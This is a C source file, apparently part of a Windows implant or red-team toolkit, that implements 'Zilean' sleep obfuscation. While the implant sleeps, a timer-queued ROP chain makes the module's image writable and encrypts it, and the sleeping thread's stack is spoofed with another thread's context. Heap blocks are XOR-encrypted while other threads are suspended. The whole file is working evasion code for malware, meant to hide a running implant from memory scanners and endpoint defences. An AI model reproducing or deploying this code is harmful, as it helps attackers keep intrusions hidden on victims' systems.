// Zilean.c
#include <Windows.h>
#include <intrin.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

extern WIN32_API g_Win32;

/*=========================================
@ XorCipher & Random32 Encryption Functions
===========================================*/
VOID XorCipher(IN PBYTE pBuffer, IN SIZE_T sBufferSize, IN PBYTE pKey, IN SIZE_T sKeySize) {

	for (SIZE_T i = 0, j = 0; i < sBufferSize; i++, j++) {

		if (j >= sKeySize)
			j = 0;

		if (i % 2 == 0)
			pBuffer[i] = pBuffer[i] ^ pKey[j];
		else
			pBuffer[i] = pBuffer[i] ^ pKey[j] ^ j;
	}
}

ULONG Random32() {

	UINT32 Seed = { 0 };

	_rdrand32_step(&Seed);

	return Seed;
}

/*=========================================
@ GetRandomThreadCtx Function
===========================================*/
BOOL GetRandomThreadCtx(OUT PCONTEXT pCtx) {

	ULONG								ReturnLength1			= { 0 };
	ULONG								ReturnLength2			= { 0 };
	PSYSTEM_PROCESS_INFORMATION			SystemInfo				= { 0 };
	PVOID								TempValue				= { 0 };
	HANDLE								ThreadHandle			= { 0 };
	NTSTATUS							Status					= { 0 };
	DWORD								CurrentProcessId		= GetCurrentProcessId();
	DWORD								CurrentThreadId			= GetCurrentThreadId();
	BOOL								Success					= FALSE;

//-------------------------------------------------

	// Call NtQuerySystemInformation for the first time, which will fail with 'STATUS_INFO_LENGTH_MISMATCH'
	if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength1)) != STATUS_SUCCESS && Status != STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
		DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Allocate buffer of size 'ReturnLength1'
	SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);
	if (SystemInfo == NULL) {
#ifdef DEBUG
		DBGPRINT("[-] HeapAlloc Failed With Error -> [%d] - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	TempValue = SystemInfo;

	// Call NtQuerySystemInformation again with correct arguments
	if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, SystemInfo, ReturnLength1, &ReturnLength2)) != STATUS_SUCCESS) {
#ifdef DEBUG
		DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Iterate through process list
	while (TRUE) {

		// Find the local process
		if ((DWORD)SystemInfo->UniqueProcessId == CurrentProcessId) {

			// Iterate through thread list
			for (DWORD i = 0; i < SystemInfo->NumberOfThreads; i++) {

				DWORD ThreadId = (DWORD)SystemInfo->Threads[i].ClientId.UniqueThread;
				
				// Skip local thread
				if (ThreadId == CurrentThreadId)
					continue;

				// Open a handle to the thread
				CLIENT_ID ClientId = {
					.UniqueProcess	= (HANDLE)CurrentProcessId,
					.UniqueThread	= (HANDLE)ThreadId
				};

				OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(OBJECT_ATTRIBUTES) };

				if (!NT_SUCCESS(Status = g_Win32.Nt.NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &ObjectAttributes, &ClientId)))
					continue;

				// Get the context
				pCtx->ContextFlags = CONTEXT_ALL;
				if (!NT_SUCCESS(Status = g_Win32.Nt.NtGetContextThread(ThreadHandle, pCtx))) {
					DELETE_HANDLE(ThreadHandle);
					continue;
				}

				break;
			}

			break;
		}

		// If NextEntryOffset is 0, that means we reached the end
		if (!SystemInfo->NextEntryOffset)
			break;

		// Move to the next entry
		SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset);
	}

	Success = TRUE;

Leave:
	if (TempValue) {
		DELETE_PTR(TempValue);
	}

	if (ThreadHandle) {
		DELETE_HANDLE(ThreadHandle);
	}

	return Success;
}

/*=========================================
@ SuspendThreads Function
===========================================*/
BOOL SuspendThreads(IN DWORD WorkerThreadId) {

	ULONG								ReturnLength1			= { 0 };
	ULONG								ReturnLength2			= { 0 };
	PSYSTEM_PROCESS_INFORMATION			SystemInfo				= { 0 };
	PVOID								TempValue				= { 0 };
	HANDLE								ThreadHandle			= { 0 };
	NTSTATUS							Status					= { 0 };
	DWORD								CurrentProcessId		= GetCurrentProcessId();
	DWORD								CurrentThreadId			= GetCurrentThreadId();
	BOOL								Success					= FALSE;

	//-------------------------------------------------

		// Call NtQuerySystemInformation for the first time, which will fail with 'STATUS_INFO_LENGTH_MISMATCH'
	if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength1)) != STATUS_SUCCESS && Status != STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
		DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Allocate buffer of size 'ReturnLength1'
	SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);
	if (SystemInfo == NULL) {
#ifdef DEBUG
		DBGPRINT("[-] HeapAlloc Failed With Error -> [%d] - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	TempValue = SystemInfo;

	// Call NtQuerySystemInformation again with correct arguments
	if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, SystemInfo, ReturnLength1, &ReturnLength2)) != STATUS_SUCCESS) {
#ifdef DEBUG
		DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Iterate through process list
	while (TRUE) {

		// Find the local process
		if ((DWORD)SystemInfo->UniqueProcessId == CurrentProcessId) {

			// Iterate through thread list
			for (DWORD i = 0; i < SystemInfo->NumberOfThreads; i++) {

				DWORD ThreadId = (DWORD)SystemInfo->Threads[i].ClientId.UniqueThread;

				// Skip local & worker thread
				if (ThreadId == CurrentThreadId || ThreadId == WorkerThreadId)
					continue;

				// Open a handle to the thread
				CLIENT_ID ClientId = {
					.UniqueProcess = (HANDLE)CurrentProcessId,
					.UniqueThread = (HANDLE)ThreadId
				};

				OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(OBJECT_ATTRIBUTES) };

				if (!NT_SUCCESS(Status = g_Win32.Nt.NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &ObjectAttributes, &ClientId)))
					continue;

				// Suspend threads
				g_Win32.Nt.NtSuspendThread(ThreadHandle, NULL);
				DELETE_HANDLE(ThreadHandle);
			}

			break;
		}
		
		// If NextEntryOffset is 0, that means we reached the end
		if (!SystemInfo->NextEntryOffset)
			break;

		// Move to the next entry
		SystemInfo = ((PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset));
	}

	Success = TRUE;

Leave:
	if (TempValue) {
		DELETE_PTR(TempValue);
	}

	if (ThreadHandle) {
		DELETE_HANDLE(ThreadHandle);
	}

	return Success;
}


/*=========================================
@ ResumeThreads Function
===========================================*/
BOOL ResumeThreads(IN DWORD WorkerThreadId) {

	ULONG								ReturnLength1			= { 0 };
	ULONG								ReturnLength2			= { 0 };
	PSYSTEM_PROCESS_INFORMATION			SystemInfo				= { 0 };
	PVOID								TempValue				= { 0 };
	HANDLE								ThreadHandle			= { 0 };
	NTSTATUS							Status					= { 0 };
	DWORD								CurrentProcessId		= GetCurrentProcessId();
	DWORD								CurrentThreadId			= GetCurrentThreadId();
	BOOL								Success					= FALSE;

	//-------------------------------------------------

		// Call NtQuerySystemInformation for the first time, which will fail with 'STATUS_INFO_LENGTH_MISMATCH'
	if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength1)) != STATUS_SUCCESS && Status != STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
		DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Allocate buffer of size 'ReturnLength1'
	SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);
	if (SystemInfo == NULL) {
#ifdef DEBUG
		DBGPRINT("[-] HeapAlloc Failed With Error -> [%d] - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	TempValue = SystemInfo;

	// Call NtQuerySystemInformation again with correct arguments
	if ((Status = g_Win32.Nt.NtQuerySystemInformation(SystemProcessInformation, SystemInfo, ReturnLength1, &ReturnLength2)) != STATUS_SUCCESS) {
#ifdef DEBUG
		DBGPRINT("[-] NtQuerySystemInformation Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Iterate through process list
	while (TRUE) {

		// Find the local process
		if ((DWORD)SystemInfo->UniqueProcessId == CurrentProcessId) {

			// Iterate through thread list
			for (DWORD i = 0; i < SystemInfo->NumberOfThreads; i++) {

				DWORD ThreadId = (DWORD)SystemInfo->Threads[i].ClientId.UniqueThread;

				// Skip local & worker thread
				if (ThreadId == CurrentThreadId || ThreadId == WorkerThreadId)
					continue;

				// Open a handle to the thread
				CLIENT_ID ClientId = {
					.UniqueProcess = (HANDLE)CurrentProcessId,
					.UniqueThread = (HANDLE)ThreadId
				};

				OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(OBJECT_ATTRIBUTES) };

				if (!NT_SUCCESS(Status = g_Win32.Nt.NtOpenThread(&ThreadHandle, THREAD_ALL_ACCESS, &ObjectAttributes, &ClientId)))
					continue;

				// Resume threads
				g_Win32.Nt.NtResumeThread(ThreadHandle, NULL);
				DELETE_HANDLE(ThreadHandle);
			}

			break;
		}

		// If NextEntryOffset is 0, that means we reached the end
		if (!SystemInfo->NextEntryOffset)
			break;

		// Move to the next entry
		SystemInfo = ((PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset));
	}

	Success = TRUE;

Leave:
	if (TempValue) {
		DELETE_PTR(TempValue);
	}

	if (ThreadHandle) {
		DELETE_HANDLE(ThreadHandle);
	}

	return Success;
}

/*=========================================
@ HeapDataEncrypt Function
===========================================*/
typedef struct _HEAP_CRYPT {
	BYTE EncryptionKey[16];
} HEAP_CRYPT, *PHEAP_CRYPT;

#define MAX_PROCESS_HEAPS 256

VOID HeapDataEncrypt(IN PHEAP_CRYPT pHeapCrypt, IN DWORD WorkerThreadId, IN BOOL Start) {

	RTL_HEAP_WALK_ENTRY					HeapEntry								= { 0 };
	ULONG								NumberOfHeaps							= { 0 };
	PVOID								ProcessHeaps[MAX_PROCESS_HEAPS]			= { 0 };

	NumberOfHeaps = GetProcessHeaps(0, 0);

	if (NumberOfHeaps > MAX_PROCESS_HEAPS) {
		NumberOfHeaps = MAX_PROCESS_HEAPS;
	}

	NumberOfHeaps = GetProcessHeaps(NumberOfHeaps, ProcessHeaps);

//----------------------------------------------------------------

	if (Start) {

		for (DWORD i = 0; i < sizeof(pHeapCrypt->EncryptionKey); i++) {
			pHeapCrypt->EncryptionKey[i] = Random32();
		}

		if (!SuspendThreads(WorkerThreadId)) {
			return;
		}
	} else {
		if (!ResumeThreads(WorkerThreadId)) {
			return;
		}
	}

	for (DWORD i = 0; i < NumberOfHeaps; i++) {

		if (ProcessHeaps[i] == GetProcessHeap()) {
			continue;
		}

		RtlSecureZeroMemory(&HeapEntry, sizeof(RTL_HEAP_WALK_ENTRY));
		while (g_Win32.Nt.RtlWalkHeap(ProcessHeaps[i], &HeapEntry)) {
			if (HeapEntry.Flags & PROCESS_HEAP_ENTRY_BUSY) {
				XorCipher(HeapEntry.DataAddress, HeapEntry.DataSize, pHeapCrypt->EncryptionKey, sizeof(pHeapCrypt->EncryptionKey));
			}
		}
	}
}

/*=========================================
@ GetWorkerThreadId Function
===========================================*/
VOID GetWorkerThreadId(OUT PDWORD ThreadId) {
	*ThreadId = GetCurrentThreadId();
}

/*=========================================
@ ZileanSleep Function
===========================================*/
VOID ZileanSleep(IN DWORD Timeout) {

	NTSTATUS				Status				= { 0 };
	CONTEXT					Ctx[10]				= { 0 };
	CONTEXT					CtxInit				= { 0 };
	CONTEXT					CtxBackup			= { 0 };
	CONTEXT					CtxSpoof			= { 0 };
	HANDLE					EventTimer			= { 0 };
	HANDLE					EventStart			= { 0 };
	HANDLE					EventWait			= { 0 };
	HANDLE					EventEnd			= { 0 };
	HANDLE					Timer				= { 0 };
	HANDLE					Thread				= { 0 };
	DWORD					Delay				= { 0 };
	DWORD					Protect				= { 0 };
	DWORD					ThreadId			= { 0 };
	HEAP_CRYPT				HeapCrypt			= { 0 };

	// Get image base & size of image
	PVOID ImageBase		= LdrGetModule(NULL);
	ULONG SizeOfImage	= ((PIMAGE_NT_HEADERS)(U_PTR(ImageBase) + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

#ifdef DEBUG
	DBGPRINT("[*] Starting Zilean Sleep Obfuscation With Stack Duplication & Heap Encryption \n");
	DBGPRINT("[i] Image@ -> [0x%p] -> [%ld] Bytes \n", ImageBase, SizeOfImage);
#endif

	// Create events for starting the rop chain and waiting for it to finish
	if (!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
		!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
		!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
		!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)))
	{
#ifdef DEBUG
		DBGPRINT("[-] NtCreateEvent Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}
	
	// Get a thread context from local process
	CtxSpoof.ContextFlags = CtxBackup.ContextFlags = CONTEXT_ALL;
	if (!GetRandomThreadCtx(&CtxSpoof)) {
#ifdef DEBUG
		DBGPRINT("[-] Failed To Get Thread Context To Spoof - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	// Fix race condition
	if (NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, GetWorkerThreadId, &ThreadId, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE)) &&
		NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, (PVOID)g_Win32.Nt.RtlCaptureContext, &CtxInit, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE))
	) {

		if (NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, (PVOID)g_Win32.K32.SetEvent, EventTimer, Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE)))
		{
			if (!NT_SUCCESS(Status = g_Win32.Nt.NtWaitForSingleObject(EventTimer, FALSE, NULL))) {
#ifdef DEBUG
				DBGPRINT("[-] NtWaitForSingleObject Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
				goto Leave;
			}

			// Create a handle to the local process
			if (!NT_SUCCESS(Status = g_Win32.Nt.NtDuplicateObject(NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Thread, THREAD_ALL_ACCESS, 0, 0))) {
#ifdef DEBUG
				DBGPRINT("[-] NtDuplicateObject Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
				goto Leave;
			}

			// Prepare rop chain
			for (DWORD i = 0; i < ARRAYSIZE(Ctx); i++) {
				MEMCPY(&Ctx[i], &CtxInit, sizeof(CONTEXT));
				Ctx[i].Rsp -= sizeof(PVOID);
			}

			// Start of ropchain
			Ctx[0].Rip = U_PTR(g_Win32.K32.WaitForSingleObjectEx);
			Ctx[0].Rcx = U_PTR(EventStart);
			Ctx[0].Rdx = U_PTR(INFINITE);
			Ctx[0].R8  = U_PTR(FALSE);

			// Change memory permission to RW
			Ctx[1].Rip = U_PTR(g_Win32.K32.VirtualProtect);
			Ctx[1].Rcx = U_PTR(ImageBase);
			Ctx[1].Rdx = U_PTR(SizeOfImage);
			Ctx[1].R8  = U_PTR(PAGE_READWRITE);
			Ctx[1].R9  = U_PTR(&Protect);

			// Encrypt image base address
			Ctx[2].Rip = U_PTR(g_Win32.CryptBase.SystemFunction040);
			Ctx[2].Rcx = U_PTR(ImageBase);
			Ctx[2].Rdx = U_PTR(SizeOfImage);
			
			// Get backup of current context
			Ctx[3].Rip = U_PTR(g_Win32.Nt.NtGetContextThread);
			Ctx[3].Rcx = U_PTR(Thread);
			Ctx[3].Rdx = U_PTR(&CtxBackup);

			// Spoof of current thread stack
			Ctx[4].Rip = U_PTR(g_Win32.Nt.NtSetContextThread);
			Ctx[4].Rcx = U_PTR(Thread);
			Ctx[4].Rdx = U_PTR(&CtxSpoof);

			// Sleep
			Ctx[5].Rip = U_PTR(g_Win32.K32.WaitForSingleObjectEx);
			Ctx[5].Rcx = U_PTR(NtCurrentProcess());
			Ctx[5].Rdx = U_PTR(Timeout);
			Ctx[5].R8  = U_PTR(FALSE);

			// Restore thread context from backup
			Ctx[6].Rip = U_PTR(g_Win32.Nt.NtSetContextThread);
			Ctx[6].Rcx = U_PTR(Thread);
			Ctx[6].Rdx = U_PTR(&CtxBackup);

			// Decrypt image base address
			Ctx[7].Rip = U_PTR(g_Win32.CryptBase.SystemFunction041);
			Ctx[7].Rcx = U_PTR(ImageBase);
			Ctx[7].Rdx = U_PTR(SizeOfImage);

			// Change memory permission to RX
			Ctx[8].Rip = U_PTR(g_Win32.K32.VirtualProtect);
			Ctx[8].Rcx = U_PTR(ImageBase);
			Ctx[8].Rdx = U_PTR(SizeOfImage);
			Ctx[8].R8  = U_PTR(PAGE_EXECUTE_READ);
			Ctx[8].R9  = U_PTR(&Protect);

			// End of ropchain
			Ctx[9].Rip = U_PTR(g_Win32.K32.SetEvent);
			Ctx[9].Rcx = U_PTR(EventEnd);
		

			// Encrypt the enumerated heap blocks
			HeapDataEncrypt(&HeapCrypt, ThreadId, TRUE);

#ifdef DEBUG
			DBGPRINT("[*] Queue sleep obfuscation chain \n");
#endif
			// Execute timers
			for (DWORD i = 0; i < ARRAYSIZE(Ctx); i++) {
				if (!NT_SUCCESS(Status = g_Win32.Nt.RtlRegisterWait(&Timer, EventWait, g_Win32.Nt.NtContinue, &Ctx[i], Delay += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE))) {
#ifdef DEBUG
					DBGPRINT("[-] RtlRegisterWait Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
					goto Leave;
				}
			}

#ifdef DEBUG
			DBGPRINT("[*] Trigger sleep obfuscation chain \n");
#endif
			// Trigger sleep obfuscation chain
			Status = g_Win32.Nt.NtSignalAndWaitForSingleObject(EventStart, EventWait, FALSE, NULL);

			// Decrypt the enumerated heap blocks
			HeapDataEncrypt(&HeapCrypt, ThreadId, FALSE);

			if (!NT_SUCCESS(Status)) {
#ifdef DEBUG
				DBGPRINT("[-] NtSignalAndWaitForSingleObject Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
				goto Leave;
			}
		} else {
#ifdef DEBUG
			DBGPRINT("[-] RtlRegisterWait Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		}
	} else {
#ifdef DEBUG
		DBGPRINT("[-] RtlRegisterWait Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
	}

#ifdef DEBUG
	DBGPRINT("[*] Ending sleep obfuscation chain \n");
#endif

Leave:
	if (EventTimer) {
		DELETE_HANDLE(EventTimer);
	}

	if (EventStart) {
		DELETE_HANDLE(EventStart);
	}

	if (EventWait) {
		DELETE_HANDLE(EventWait);
	}

	if (EventEnd) {
		DELETE_HANDLE(EventEnd);
	}

	if (Thread) {
		DELETE_HANDLE(Thread);
	}
} 
